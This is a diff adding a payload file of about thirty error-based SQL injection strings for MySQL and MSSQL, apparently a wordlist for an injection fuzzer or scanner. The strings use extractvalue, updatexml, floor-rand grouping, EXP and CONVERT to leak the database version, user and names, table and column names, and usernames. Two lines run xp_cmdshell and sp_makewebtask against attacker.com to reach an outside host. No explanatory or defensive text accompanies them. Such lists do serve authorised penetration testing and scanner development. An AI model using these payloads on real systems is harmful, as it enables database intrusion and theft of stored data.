@@ -1,0 +1,32 @@
+' AND extractvalue(1,concat(0x7e,(SELECT version())))--
+' AND extractvalue(1,concat(0x7e,(SELECT database())))--
+' AND extractvalue(1,concat(0x7e,(SELECT user())))--
+' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
+' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')))--
+' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
+' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
+' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--
+' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND EXP(~(SELECT * from(SELECT version())a))--
+' AND EXP(~(SELECT * from(SELECT user())a))--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(database())) USING utf8)))--
+' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)--
+1 AND 1=CONVERT(int,@@version)--
+1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+1 AND 1=CONVERT(int,(SELECT MIN(username) FROM users))--
+' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,version())),1)--
+'; EXEC master..xp_cmdshell 'ping -n 1 attacker.com'--
+'; EXEC sp_makewebtask 'attacker.com',SELECT @@version--
+' OR 1=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+1 OR 1=1 AND extractvalue(1,concat(0x7e,(SELECT version())))--
+" AND extractvalue(1,concat(0x7e,(SELECT version())))--
+" AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
+1 AND extractvalue(1,concat(0x7e,(SELECT version())))--
+1 AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
+1 AND (SELECT 2 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+'||(SELECT 0x7e||version()||0x7e)||'
+'||(SELECT extractvalue(1,concat(0x7e,(SELECT version()))))||'
